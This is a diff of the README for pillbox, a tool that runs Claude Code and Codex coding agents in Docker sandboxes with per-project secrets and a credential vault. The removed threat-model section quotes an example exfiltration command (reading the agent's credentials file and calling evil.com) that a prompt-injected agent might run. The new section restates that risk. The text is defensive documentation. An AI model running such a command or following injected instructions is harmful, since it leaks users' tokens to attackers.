@@ -1,102 +1,173 @@
 # pillbox
 
-**Sandboxed coding agents with one-command auth.** Think `gh auth login` for
-Claude Code, Codex, and (soon) opencode.
+**Sandboxed coding agents, bundled.** A pillbox is a self-contained unit
+of (workspace + code + vault + config) that an agent runs against.
+Create one for your machine, create one per project, run `claude` or
+`codex` inside it.
 
 ```sh
-pillbox claude login           # one-shot OAuth flow inside a Docker sandbox
-pillbox claude run             # sandbox + claude with your auth + cwd mounted in
-pillbox codex login            # codex uses --device-auth (URL + code, no callback)
-pillbox codex run
+pillbox init                          # one-time: create the global pillbox
+pillbox auth login --agent claude     # one-time per agent (OAuth in sandbox)
 
-pillbox auth list              # what's authenticated
-pillbox auth rm claude         # forget it
+cd ~/work/my-project
+pillbox new --name my-project         # writes pillbox.toml + per-project state
+pillbox run                           # sandbox + claude + cwd mounted in
 ```
 
-## Why
+That's the v0.6 model in one screenshot. The rest of this file is reference.
 
-Coding agents need credentials. Running them on bare metal means a misconfigured
-prompt / poisoned doc / bad plugin can read whatever's in your shell
-environment. Pillbox runs each agent inside a fresh Docker sandbox so the host
-environment stays isolated, and gives each agent its own persistent HOME
-directory that the agent populates exactly as it does on bare metal.
+## Why "pillbox-as-bundle"
 
-The login flow is itself sandboxed: `pillbox claude login` runs `claude auth
-login` inside a fresh container with a clean `/home/lum` mounted from
-`~/.pillbox/data/claude/`. Whatever the agent writes — `.credentials.json`,
-profile config, settings, refresh tokens — persists there naturally. Next
-`pillbox claude run` re-mounts the same directory and the agent picks up
-exactly where it left off.
+Coding agents need credentials, state, and a workspace to act on. Mixing
+those concerns into one bundle gives you:
+
+- **One mental model.** A pillbox is the thing you create, list, run,
+  remove. No more `claude` / `codex` / `secret` / `env` / `auth` / `vault`
+  as top-level subjects.
+- **Project isolation.** Per-project secrets, per-project env bundles,
+  per-project vault state. One project's leases never collide with
+  another's.
+- **Shared agent auth.** A single `pillbox auth login --agent claude`
+  lives in the global pillbox and is reused across every project.
+- **A path to remote.** v0.6 PR 4+ adds remote-sandbox backends; the
+  pillbox is the unit that ships across the wire (workspace + vault
+  state + config).
 
 ## Where state lives
 
 ```
-~/.pillbox/data/claude/         # claude's HOME between runs
-  .claude/.credentials.json     # OAuth state
-  .claude.json                  # profile config
-  .claude/settings.json         # user prefs
-  ...                           # whatever else the agent writes to HOME
-
-~/.pillbox/data/codex/          # codex's HOME between runs
-  .codex/auth.json
-  .codex/config.toml
-  ...
+~/.pillbox/                        # 0700
+├── global/                        # global pillbox
+│   ├── secrets/                   # cross-project secrets, project shadows
+│   ├── env/                       # cross-project env bundles
+│   ├── auth/{claude,codex}/       # agent OAuth state (always global today)
+│   └── vault/                     # CA + key
+└── projects/
+    └── -Users-vuln-work-foo/      # `/Users/vuln/work/foo` with `/` → `-`
+        ├── meta.json              # { name, created_at, agent_default }
+        ├── secrets/               # overrides global on key conflict
+        ├── env/
+        ├── auth/                  # reserved (per-project auth → v0.7)
+        └── vault/
 ```
 
-Directories are 0700, files default to whatever the agent writes (typically
-0600 for cred files).
+The state-dir key is the absolute path of the directory holding
+`pillbox.toml`, with `/` replaced by `-`. Human-readable, greppable,
+unique per host.
 
-## Threat model (be specific)
+## pillbox.toml
+
+```toml
+# required
+name = "my-project"
+
+# optional — default agent for `pillbox run`
+agent = "claude"          # or "codex"
+
+# reserved for PR 3 (workspace backends)
+[workspace]
+```
+
+Discovery walks up from cwd looking for `pillbox.toml` (like `.gitignore`
+or `Cargo.toml`). First match wins. Pass `--pillbox NAME` to bypass
+discovery and operate on a specific named pillbox.
+
+## Command surface (v0.6)
+
+### Lifecycle
+
+| Command | What it does |
+|---|---|
+| `pillbox init` | Create the global pillbox at `~/.pillbox/global/`. Idempotent. |
+| `pillbox new [--name N] [--agent A]` | Create a project pillbox in cwd. |
+| `pillbox list [--json]` | Every pillbox on disk. |
+| `pillbox rm NAME` | Delete a project pillbox by name or key. Refuses to remove `global`. |
+| `pillbox info [--json]` | Show the current pillbox (resolved from cwd or `--pillbox`). |
+
+### Per-pillbox
+
+| Command | What it does |
+|---|---|
+| `pillbox run [--agent A] [opts] [-- args]` | Launch the agent against the current pillbox. |
+| `pillbox secret add/list/show/rm [--global]` | Manage secrets (project default; `--global` writes to global). |
+| `pillbox env load/list/show/rm [--global]` | Manage env bundles (same scoping). |
+| `pillbox auth login/list/rm --agent A` | Manage agent OAuth state (always global in v0.6). |
+| `pillbox vault ca/status` | Inspect the per-pillbox vault CA. |
+| `pillbox sidecar [--bind] [--json]` | Run the credential vault as a standalone process. |
+| `pillbox doctor [--json]` | Diagnose the environment. |
+| `pillbox version` | Print pillbox + runner-image versions. |
+
+`--pillbox NAME` is global — usable on every per-pillbox command to
+override cwd-based discovery.
+
+## Inheritance rules
+
+| What | Read | Write default | `--global` |
+|---|---|---|---|
+| Secrets | project + global (project wins) | resolved pillbox | force global |
+| Env bundles | project + global (project wins) | resolved pillbox | force global |
+| Auth | global | global | (implicit, accepted for fwd-compat) |
+| Vault | per-pillbox | per-pillbox | n/a |
+
+A project pillbox always sees the global pillbox as a fallback for
+secrets and env bundles. The global pillbox sees only itself.
+
+## Hard reset from v0.5
+
+v0.6 is a deliberate identity reset. There is no migration shim. If
+`~/.pillbox/` contains the v0.5 layout (`data/`, `secrets/`, `env/`, or
+`vault/` at the top level), v0.6 refuses to run and prints:
+
+```
+pillbox: pillbox init failed. detected v0.5 pillbox state (~/.pillbox/data/, ...).
+v0.6 is a hard reset — no migration shim.
+  Next: mv ~/.pillbox ~/.pillbox.v0.5-backup && pillbox init  # then re-add secrets / login
+```
+
+Back up, init, re-login. Auth state, secrets, and env bundles do not
+carry over.
+
+## Threat model
 
 Pillbox **does** defend against:
-- Agent reading host environment variables or your real `~/.claude` /
-  `~/.codex` / `~/.gh` (the sandbox only sees `~/.pillbox/data/<provider>`).
-- The login flow itself pulling in host state — the login container is fresh
-  every invocation.
-- Other tools / scripts on the host accidentally consuming pillbox's auth
-  state (it's namespaced under `~/.pillbox/`).
+
+- An agent reading host environment variables or the user's real
+  `~/.claude` / `~/.codex` / `~/.gh`. The sandbox only sees the resolved
+  pillbox's auth dir.
+- The login flow contaminating future runs. Login containers are
+  one-shot.
+- Other host tools accidentally consuming pillbox state — everything is
+  namespaced under `~/.pillbox/`.
 
 Pillbox **does not** defend against:
-- An agent with shell access exfiltrating the credentials it was *given*. A
-  prompt-injected agent that runs `cat ~/.claude/.credentials.json && curl
-  evil.com` leaks its own token. The v0.4 vault tier addresses this for
-  API-key credentials (stub-and-proxy-swap); OAuth subscription tokens are
-  treated as a mount, not a vault.
-- Stolen unencrypted backups of `~/.pillbox/`. Encryption-at-rest comes from
-  your disk encryption (FileVault on macOS, LUKS on Linux, BitLocker on
-  Windows). If those aren't on, pillbox's state files are plaintext on
-  disk — same posture as `~/.aws/credentials`, `~/.docker/config.json`,
-  `~/.gh/hosts.yml`.
-- Compromised Docker daemon, container escape, or kernel-level attacks.
-  Pillbox uses standard Docker isolation. The v0.6 remote-sandbox model
-  moves the agent off the developer machine entirely (VPS, E2B) for
-  workloads that need stronger isolation than a local container.
 
-This is the same security posture as the rest of the developer toolchain
-(`gh`, `aws`, `docker`, `kubectl`). Pillbox is not a secrets manager — it's
-a sandbox runner.
+- A prompt-injected agent exfiltrating credentials it was given on
+  purpose. The `--vault` proxy makes leaked API keys + OAuth tokens
+  useless to an attacker; subscription tokens are still a mount.
+- Stolen unencrypted disk / backups. Files are plaintext at 0600 — disk
+  encryption (FileVault / LUKS / BitLocker) is the at-rest defense.
+- Container escape or kernel attacks. v0.6 PR 4+ adds remote-sandbox
+  backends for workloads that need stronger isolation than local Docker.
+
+This is the same posture as `gh`, `aws`, `docker`, `kubectl`. Pillbox is
+a sandbox runner, not a secrets manager.
 
 ## Status
 
-Pre-alpha. v0.3 supports Claude Code + Codex on macOS. Linux and Windows
-work *in theory* (Docker + `$HOME` exist) but haven't been tested.
+Pre-alpha. v0.6 PR 2 is the pillbox-as-bundle CLI redesign — a major
+reshape, breaking from v0.5. Roadmap:
 
-## Roadmap
+- **v0.1–v0.5** ✅ Claude / Codex sandboxing, secrets + env bundles,
+  pillbox.toml v1, credential vault (Anthropic + Codex + API keys), CI.
+- **v0.6 PR 1** ✅ `SandboxBackend` trait + sidecar mode.
+- **v0.6 PR 2** ✅ **Pillbox-as-bundle CLI** — this one.
+- **v0.6 PR 3** Workspace backends: S3/R2 + Git + Tarball + push/pull/snapshot.
+- **v0.6 PR 4** RemoteSsh backend.
+- **v0.6 PR 5** RemoteE2b backend.
+- **v0.6 PR 6** Sessions (list/attach/detach).
+- **v0.6 PR 7** Polish + README rewrite for the remote story.
 
-- **v0.1** ✅ Claude Code login + run, Docker sandbox
-- **v0.2** ✅ Codex adapter; `--workspace` / `--name` / `--mount` ergonomics;
-  persistent agent HOME under `~/.pillbox/data/<provider>/`
-- **v0.3** ✅ Secrets + env bundles + `pillbox doctor` / `version`
-- **v0.4** ✅ Per-project `pillbox.toml`; credential vault for claude's
-  Anthropic OAuth (`--vault`)
-- **v0.5** ✅ Codex vault + API-key vault + integration tests + CI
-- **v0.6** — Local-OR-remote sandbox model. Pillbox runs agents locally
-  (Docker, current) or on a remote target (VPS via SSH, E2B managed
-  cloud). Vault sidecar deploys to the remote env at session start;
-  real secrets stay in sidecar memory. `--strict` placeholder ripped
-  (was wrong scope).
-
-## Build (pre-GHCR: requires the lum-built runner image)
+## Build
 
 ```sh
 # Build the runner image (until pillbox publishes its own to GHCR)
@@ -106,29 +177,19 @@ cd ~/code/lum && bun run build:runtime-image:pillbox
 cd ~/code/pillbox && cargo install --path .
 
 # Use it
-pillbox claude login
-pillbox claude run
-```
-
-## Run-time options
-
-```
-pillbox <agent> run                    # mounts cwd at /workspace/<basename>
-pillbox <agent> run --workspace PATH   # mount PATH instead of cwd
-pillbox <agent> run --name NAME        # override the /workspace/<basename> with /workspace/NAME
-pillbox <agent> run --mount A:B        # extra bind mount, repeatable
-pillbox <agent> run -- AGENT-ARGS      # forward args to the agent CLI
+pillbox init
+pillbox auth login --agent claude
+cd ~/work/my-project && pillbox new && pillbox run
 ```
 
 ## Documentation
 
-- [AGENTS.md](./AGENTS.md) — agent-facing command reference (one screen)
+- [AGENTS.md](./AGENTS.md) — agent-facing command reference
 - [docs/](./docs/) — topic deep dives
-  - [secrets.md](./docs/secrets.md) — secrets, env bundles, precedence rules
-  - [config.md](./docs/config.md) — per-project `pillbox.toml`
-  - [vault.md](./docs/vault.md) — `--vault` MITM proxy + stub credential swap
-  - [recipes.md](./docs/recipes.md) — copy-paste flows for common tasks
-  - [security.md](./docs/security.md) — threat model and what pillbox defends against
+  - [secrets.md](./docs/secrets.md) — pillbox-scoped secrets + env bundles
+  - [config.md](./docs/config.md) — pillbox.toml descriptor
+  - [vault.md](./docs/vault.md) — per-pillbox credential vault
+  - [security.md](./docs/security.md) — threat model
 
 ## License
 
